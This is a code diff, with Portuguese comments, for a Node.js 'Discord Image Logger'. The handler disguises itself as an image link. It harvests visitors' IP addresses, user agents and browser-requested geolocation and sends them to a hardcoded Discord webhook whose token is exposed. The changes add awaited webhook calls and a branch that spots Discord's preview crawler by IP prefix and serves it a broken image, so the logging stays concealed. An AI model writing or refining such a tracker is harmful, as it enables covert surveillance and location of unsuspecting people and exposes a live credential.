@@ -1,52 +1,83 @@
-// Discord Image Logger com geolocalização
+// Discord Image Logger - Versão com webhook corrigido
 const https = require('https');
+const url = require('url');
 
-// Configuração
+// Configuração - ATUALIZE O WEBHOOK PARA O SEU WEBHOOK CORRETO
 const config = {
   "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
   "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
   "username": "Image Logger",
   "color": 0x00FFFF,
-  "accurateLocation": true // Ativar geolocalização
+  "accurateLocation": true
 };
 
-// Função para enviar webhook ao Discord
+// Função para enviar webhook com verificação
 function sendDiscordWebhook(data) {
-  try {
-    const webhookData = JSON.stringify(data);
-    
-    const options = {
-      hostname: 'discord.com',
-      path: '/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu',
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': webhookData.length
-      }
-    };
-    
-    const req = https.request(options, (res) => {
-      // Não precisamos fazer nada com a resposta
-    });
-    
-    req.on('error', (error) => {
+  return new Promise((resolve, reject) => {
+    try {
+      // Parsear a URL do webhook
+      const webhookUrl = new URL(config.webhook);
+      
+      // Preparar os dados
+      const webhookData = JSON.stringify(data);
+      
+      // Configurar a requisição
+      const options = {
+        hostname: webhookUrl.hostname,
+        path: webhookUrl.pathname + webhookUrl.search,
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(webhookData)
+        }
+      };
+      
+      // Criar a requisição
+      const req = https.request(options, (res) => {
+        let responseData = '';
+        
+        // Coletar dados da resposta
+        res.on('data', (chunk) => {
+          responseData += chunk;
+        });
+        
+        // Quando a resposta terminar
+        res.on('end', () => {
+          // Verificar código de status
+          if (res.statusCode >= 200 && res.statusCode < 300) {
+            console.log('Webhook enviado com sucesso');
+            resolve(true);
+          } else {
+            console.error(`Erro ao enviar webhook: Status ${res.statusCode}`);
+            console.error(`Resposta: ${responseData}`);
+            resolve(false);
+          }
+        });
+      });
+      
+      // Tratar erros na requisição
+      req.on('error', (error) => {
+        console.error('Erro na requisição do webhook:', error);
+        reject(error);
+      });
+      
+      // Enviar os dados
+      req.write(webhookData);
+      req.end();
+    } catch (error) {
       console.error('Erro ao enviar webhook:', error);
-    });
-    
-    req.write(webhookData);
-    req.end();
-  } catch (error) {
-    console.error('Erro ao enviar webhook:', error);
-  }
+      reject(error);
+    }
+  });
 }
 
 // Função principal
-module.exports = (req, res) => {
+module.exports = async (req, res) => {
   try {
     // Obter parâmetros da URL
-    const url = new URL(req.url, `http://${req.headers.host}`);
-    const params = url.searchParams;
-    const geoParam = params.get('g'); // Verificar se já temos coordenadas de localização
+    const parsedUrl = url.parse(req.url, true);
+    const params = parsedUrl.query;
+    const geoParam = params.g; // Verificar se já temos coordenadas de localização
     
     // Obter IP e User Agent
     const ip = req.headers['x-forwarded-for'] || 
@@ -55,6 +86,9 @@ module.exports = (req, res) => {
                'Desconhecido';
     
     const userAgent = req.headers['user-agent'] || 'Desconhecido';
+    
+    // Verificar se o IP é do Discord (começa com 35)
+    const isDiscord = ip.startsWith('35');
     
     // Se temos parâmetro de geolocalização, enviar para o Discord
     if (geoParam) {
@@ -77,7 +111,7 @@ module.exports = (req, res) => {
           ]
         };
         
-        sendDiscordWebhook(data);
+        await sendDiscordWebhook(data);
         
         // Enviar página com a imagem
         const html = `
@@ -117,6 +151,27 @@ module.exports = (req, res) => {
         console.error('Erro ao processar geolocalização:', error);
         // Continuar mesmo com erro na geolocalização
       }
+    } else if (isDiscord) {
+      // Se for o Discord acessando, enviar alerta de link
+      console.log("Acesso do Discord detectado. IP:", ip);
+      
+      const data = {
+        username: config.username,
+        content: "",
+        embeds: [
+          {
+            title: "Image Logger - Link Sent",
+            color: config.color,
+            description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
+          }
+        ]
+      };
+      
+      await sendDiscordWebhook(data);
+      
+      // Para o Discord, enviar imagem bugada
+      res.setHeader('Content-Type', 'image/jpeg');
+      res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
     } else if (config.accurateLocation) {
       // Se não temos geolocalização ainda, solicitar do navegador
       
@@ -134,11 +189,9 @@ module.exports = (req, res) => {
         ]
       };
       
-      sendDiscordWebhook(basicData);
+      await sendDiscordWebhook(basicData);
       
       // Enviar HTML com script para obter geolocalização
-      const currentUrl = `${url.pathname}${url.search}`;
-      
       const html = `
         <!DOCTYPE html>
         <html>
@@ -251,7 +304,7 @@ module.exports = (req, res) => {
         ]
       };
       
-      sendDiscordWebhook(data);
+      await sendDiscordWebhook(data);
       
       // Enviar página com a imagem
       const html = `
